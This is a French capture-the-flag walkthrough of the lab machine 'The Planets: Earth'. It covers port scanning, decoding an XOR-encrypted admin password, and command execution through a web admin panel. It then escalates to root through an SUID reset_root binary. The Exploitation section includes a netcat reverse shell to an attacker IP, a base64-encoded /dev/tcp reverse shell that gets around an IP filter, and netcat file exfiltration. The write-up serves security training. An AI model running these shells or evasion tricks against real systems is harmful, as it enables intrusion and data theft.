
# The Planets : Earth par SirFlash

Sur cette machine virtuelle décrite comme facile mais un peu plus complexe que Mercury, il faut trouver un flag user et un flag root qui contiennent chacun un hash MD5.

## Analyse
Je vais dans un premier temps récupérer l'adresse IP de la machine virtuelle puis analyser celle-ci dans le but de trouver un point d'entrée.

### Recherche de l'adresse IP de la machine virtuelle
Pour récupérer l'adresse IP de la machine virtuelle, j'exécute la commande ```sudo netdiscover -i eth1 -r 192.168.56.0/24``` et je récupère son adresse : 192.168.56.102

### Recherche d'un point d'entrée
Je commence ma recherche afin de trouver un point d'entrée.

#### Recherche avec nmap
Je lance une analyse avec la commande ```nmap -e eth1 -A -p- -T4 192.168.56.102``` :
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 06:13 EST
Nmap scan report for 192.168.56.102
Host is up (0.00057s latency).
Not shown: 65371 filtered tcp ports (no-response), 161 filtered tcp ports (host-unreach)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.6 (protocol 2.0)
| ssh-hostkey: 
|   256 5b:2c:3f:dc:8b:76:e9:21:7b:d0:56:24:df:be:e9:a8 (ECDSA)
|_  256 b0:3c:72:3b:72:21:26:ce:3a:84:e8:41:ec:c8:f8:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Bad Request (400)
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
443/tcp open  ssl/http Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
|_http-title: Test Page for the HTTP Server on Fedora
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=earth.local/stateOrProvinceName=Space
| Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local
| Not valid before: 2021-10-12T23:26:31
|_Not valid after:  2031-10-10T23:26:31
|_http-server-header: Apache/2.4.51 (Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 187.23 seconds
```

Je constate qu'il y a 3 ports ouverts :
* 22/tcp (ssh) : OpenSSH 8.6 (protocol 2.0)
* 80/tcp (http) : Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)
* 443/tcp (ssl/http) : Apache httpd 2.4.51 ((Fedora) OpenSSL/1.1.1l mod_wsgi/4.7.1 Python/3.9)

Le certificat SSL contient également deux noms DNS :
* earth.local
* terratest.earth.local

J'ajoute ces deux noms DNS dans mon fichier ```/etc/hosts``` :
```
192.168.56.102 earth.local terratest.earth.local
```

### Analyse du port 80 et 443
Je lance un ```dirb http://earth.local``` et un ```dirb https://earth.local``` qui me permet de trouver la page ```https://earth.local/admin``` qui contient un lien vers la page ```http://earth.local/admin/login```.
Puis un ```dirb http://terratest.earth.local``` et un ```dirb https://terratest.earth.local``` qui me permet de trouver le fichier ```https://terratest.earth.local/robots.txt``` qui contient :
```
User-Agent: *
Disallow: /*.asp
Disallow: /*.aspx
Disallow: /*.bat
Disallow: /*.c
Disallow: /*.cfm
Disallow: /*.cgi
Disallow: /*.com
Disallow: /*.dll
Disallow: /*.exe
Disallow: /*.htm
Disallow: /*.html
Disallow: /*.inc
Disallow: /*.jhtml
Disallow: /*.jsa
Disallow: /*.json
Disallow: /*.jsp
Disallow: /*.log
Disallow: /*.mdb
Disallow: /*.nsf
Disallow: /*.php
Disallow: /*.phtml
Disallow: /*.pl
Disallow: /*.reg
Disallow: /*.sh
Disallow: /*.shtml
Disallow: /*.sql
Disallow: /*.txt
Disallow: /*.xml
Disallow: /testingnotes.*
```

Cette dernière ligne me semble intéressante.

En essayant quelques extensions, je trouve rapidement la présence du fichier ```https://terratest.earth.local/testingnotes.txt``` dont voici son contenu :
```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```

Le fichier ```https://terratest.earth.local/testdata.txt``` contient :
```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

Avec toutes ces informations, j'ai développé un petit décodeur en Python :
```python
texte_code_hex = "2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a"
cle_ascii = "According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago."

def xor(c1, c2):
    return ''.join(format(int(a, 16) ^ int(b, 16), 'x') for a,b in zip(c1,c2))

cle_hex = cle_ascii.encode("utf-8").hex()
texte_code_hex = xor(texte_code_hex, cle_hex)
texte_code_ascii = bytes.fromhex(texte_code_hex).decode("ASCII")
print(texte_code_ascii)
```

Je récupère la chaîne suivante :
```
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
```

J'essaie de m'identifier avec :
- Username : terra
- Password : earthclimatechangebad4humans

Me voilà identifié !

## Exploitation

Sur cette nouvelle page, je suis en présence d'un formulaire qui me permet d'exécuter des commandes :
- whoami => apache
- id => uid=48(apache) gid=48(apache) groups=48(apache)
- cat /var/earth_web/user_flag.txt => [user_flag_3353b67d6437f07ba7d34afd7d2fc27d]
- nc -e /bin/sh 192.168.56.101 7777

Avec cette dernière commande, j'ai le message ```Remote connections are forbidden``` qui s'affiche.  
L'utilisation d'une adresse IP dans la commande est interdite !

Je vais donc contourner ce problème en encodant ma commande : ```echo "sh -i >& /dev/tcp/192.168.56.101/7777 0>&1" | base64```

Puis je l'exécute de cette manière : ```echo "c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC41Ni4xMDEvNzc3NyAwPiYx" | base64 -d | sh```

Ensuite j'exécute la commande ```find / -perm -u=s -type f -ls 2>/dev/null``` qui me donne cette liste de résultats :
```
 12851509     76 -rwsr-xr-x   1 root     root        74208 Aug  9 08:21 /usr/bin/chage
 12747606     80 -rwsr-xr-x   1 root     root        78536 Aug  9 08:21 /usr/bin/gpasswd
 12747609     44 -rwsr-xr-x   1 root     root        42256 Aug  9 08:21 /usr/bin/newgrp
 12851796     60 -rwsr-xr-x   1 root     root        58384 Feb 12  2021 /usr/bin/su
 12851780     52 -rwsr-xr-x   1 root     root        49920 Feb 12  2021 /usr/bin/mount
 12851799     40 -rwsr-xr-x   1 root     root        37560 Feb 12  2021 /usr/bin/umount
 12671177     32 -rwsr-xr-x   1 root     root        32648 Jun  3  2021 /usr/bin/pkexec
 13256412     32 -rwsr-xr-x   1 root     root        32712 Jan 30  2021 /usr/bin/passwd
 13256418     36 -rws--x--x   1 root     root        33488 Feb 12  2021 /usr/bin/chfn
 13256419     28 -rws--x--x   1 root     root        25264 Feb 12  2021 /usr/bin/chsh
 13256550     60 -rwsr-xr-x   1 root     root        57432 Jan 26  2021 /usr/bin/at
 13258486    184 ---s--x--x   1 root     root       185504 Jan 26  2021 /usr/bin/sudo
 12961001     24 -rwsr-xr-x   1 root     root        24552 Oct 12 22:18 /usr/bin/reset_root
   467872     16 -rwsr-xr-x   1 root     root        15632 Sep 29 18:48 /usr/sbin/grub2-set-bootflag
   468250     16 -rwsr-xr-x   1 root     root        16096 Jun 10  2021 /usr/sbin/pam_timestamp_check
   468252     24 -rwsr-xr-x   1 root     root        24552 Jun 10  2021 /usr/sbin/unix_chkpwd
   879418    116 -rwsr-xr-x   1 root     root       116064 Sep 23 18:06 /usr/sbin/mount.nfs
  4352689     24 -rwsr-xr-x   1 root     root        24536 Jun  3  2021 /usr/lib/polkit-1/polkit-agent-helper-1
```

Le fichier ```/usr/bin/reset_root``` semble être une bonne piste !

Lorsque je l'exécute, j'ai le message suivant :
```
CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
```

Je me décide donc à le récupérer pour l'analyser en exécutant les commandes suivantes :
- Sur la machine qui va réceptionner le fichier : ```nc -l -p 1234 > reset_root```
- Sur la machine qui va envoyer le fichier : ```nc -w 3 192.168.56.101 1234 < /usr/bin/reset_root```

Après l'avoir récupéré, je le rends exécutable avec ```chmod +x reset_root``` et je l'analyse avec ```strace``` :
```
┌──(kali㉿kali)-[~/Téléchargements]
└─$ strace ./reset_root 
execve("./reset_root", ["./reset_root"], 0x7fffae1d4240 /* 56 vars */) = 0
brk(NULL)                               = 0x2277000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (Aucun fichier ou dossier de ce type)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
newfstatat(3, "", {st_mode=S_IFREG|0644, st_size=70467, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 70467, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f3522d2c000
close(3)                                = 0
openat(AT_FDCWD, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0000y\2\0\0\0\0\0"..., 832) = 832
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
pread64(3, "\4\0\0\0\20\0\0\0\5\0\0\0GNU\0\2\200\0\300\4\0\0\0\1\0\0\0\0\0\0\0", 32, 848) = 32
pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\320\276\243\212\v\307^\t\263h8\371\266h\r\350"..., 68, 880) = 68
newfstatat(3, "", {st_mode=S_IFREG|0755, st_size=1835120, ...}, AT_EMPTY_PATH) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f3522d2a000
pread64(3, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
mmap(NULL, 1868664, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f3522b61000
mprotect(0x7f3522b87000, 1654784, PROT_NONE) = 0
mmap(0x7f3522b87000, 1343488, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x26000) = 0x7f3522b87000
mmap(0x7f3522ccf000, 307200, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x16e000) = 0x7f3522ccf000
mmap(0x7f3522d1b000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b9000) = 0x7f3522d1b000
mmap(0x7f3522d21000, 33656, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7f3522d21000
close(3)                                = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f3522b5f000
arch_prctl(ARCH_SET_FS, 0x7f3522d2b580) = 0
mprotect(0x7f3522d1b000, 12288, PROT_READ) = 0
mprotect(0x403000, 4096, PROT_READ)     = 0
mprotect(0x7f3522d6d000, 8192, PROT_READ) = 0
munmap(0x7f3522d2c000, 70467)           = 0
newfstatat(1, "", {st_mode=S_IFCHR|0600, st_rdev=makedev(0x88, 0x1), ...}, AT_EMPTY_PATH) = 0
brk(NULL)                               = 0x2277000
brk(0x2298000)                          = 0x2298000
write(1, "CHECKING IF RESET TRIGGERS PRESE"..., 38CHECKING IF RESET TRIGGERS PRESENT...
) = 38
access("/dev/shm/kHgTFI5G", F_OK)       = -1 ENOENT (Aucun fichier ou dossier de ce type)
access("/dev/shm/Zw7bV9U5", F_OK)       = -1 ENOENT (Aucun fichier ou dossier de ce type)
access("/tmp/kcM0Wewe", F_OK)           = -1 ENOENT (Aucun fichier ou dossier de ce type)
write(1, "RESET FAILED, ALL TRIGGERS ARE N"..., 44RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
) = 44
exit_group(0)                           = ?
+++ exited with 0 +++
```

Je vais créer les fichiers attendus :
```
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
```

Puis je relance le programme ```/usr/bin/reset_root``` :
```
CHECKING IF RESET TRIGGERS PRESENT...
RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth
```

Ensuite, je n'ai plus qu'à me connecter et à chercher le flag :
```
cat /root/root_flag.txt

              _-o#&&*''''?d:>b\_
          _o/"`''  '',, dMF9MMMMMHo_
       .o&#'        `"MbHMMMMMMMMMMMHo.
     .o"" '         vodM*$&&HMMMMMMMMMM?.
    ,'              $M&ood,~'`(&##MMMMMMH\
   /               ,MMMMMMM#b?#bobMMMMHMMML
  &              ?MMMMMMMMMMMMMMMMM7MMM$R*Hk
 ?$.            :MMMMMMMMMMMMMMMMMMM/HMMM|`*L
|               |MMMMMMMMMMMMMMMMMMMMbMH'   T,
$H#:            `*MMMMMMMMMMMMMMMMMMMMb#}'  `?
]MMH#             ""*""""*#MMMMMMMMMMMMM'    -
MMMMMb_                   |MMMMMMMMMMMP'     :
HMMMMMMMHo                 `MMMMMMMMMT       .
?MMMMMMMMP                  9MMMMMMMM}       -
-?MMMMMMM                  |MMMMMMMMM?,d-    '
 :|MMMMMM-                 `MMMMMMMT .M|.   :
  .9MMM[                    &MMMMM*' `'    .
   :9MMk                    `MMM#"        -
     &M}                     `          .-
      `&.                             .
        `~,   .                     ./
            . _                  .-
              '`--._,dd###pp=""'

Congratulations on completing Earth!
If you have any feedback please contact me at SirFlash@protonmail.com
[root_flag_b0da9554d29db2117b02aa8b66ec492e]
```
